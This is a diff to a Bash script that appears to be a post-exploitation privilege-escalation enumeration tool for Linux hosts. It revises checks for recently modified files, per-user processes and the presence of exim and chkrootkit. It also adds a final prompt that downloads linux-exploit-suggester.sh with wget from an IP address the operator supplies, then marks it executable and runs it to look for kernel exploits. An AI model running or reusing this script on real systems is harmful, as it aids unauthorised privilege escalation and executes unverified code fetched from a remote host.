@@ -93,25 +93,15 @@ echo ""
 
 find / -mmin -10 ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" -type f -readable 2>/dev/null  | grep -Ev "^/proc"
 
-echo ""
+
 echo ""
 echo "#####################################################"
-echo "Checking root process"
+echo "Processes"
 echo "#####################################################"
 echo ""
 echo ""
 
-ps -aux  | awk '$4 > 0.0 && $10 != "0:00"  && $10 != "0:00.00" {print $0}' | grep "root"
-
-echo ""
-echo ""
-echo "#####################################################"
-echo "Checking non root process"
-echo "#####################################################"
-echo ""
-echo ""
-
-ps -aux  | awk '$4 > 0.0 && $10 != "0:00"  && $10 != "0:00.00" {print $0}'  | grep -v "root"
+for i in $(cat /etc/passwd | grep "sh$" | awk -F ":" '{print $1}'); do echo "##############################"; echo " Process running by $i"; echo "##############################"; ps -aux | grep $i | grep -v "0:00 grep" | awk '$4 > 0.0 {print $0}' ;  echo;   done
 
 echo ""
 echo ""
@@ -327,7 +317,8 @@ echo ""
 echo ""
 
 find / -name chkrootkit 2> /dev/null
-dpkg -l | grep exim 2> /dev/null
+dpkg -l | awk '{print $2}' | sort -u | grep exim 2> /dev/null
+#whereis exim4; /usr/sbin/exim4 --version | head -1
 
 echo ""
 echo ""
@@ -724,3 +715,12 @@ echo "Try linux suggester if nothing found"
 echo "Activating ls in detail mode"
 
 alias ls="ls -la"
+
+read -p "Do you want to try kernel exploit ? (y/n) " answer
+if [[ $answer != 'n' && $answer != 'N' ]]
+	then
+		read -p "IP Address to download checker " ip_addr
+		wget $ip_addr/linux-exploit-suggester.sh
+		chmod +x linux-exploit-suggester.sh
+		./linux-exploit-suggester.sh
+fi
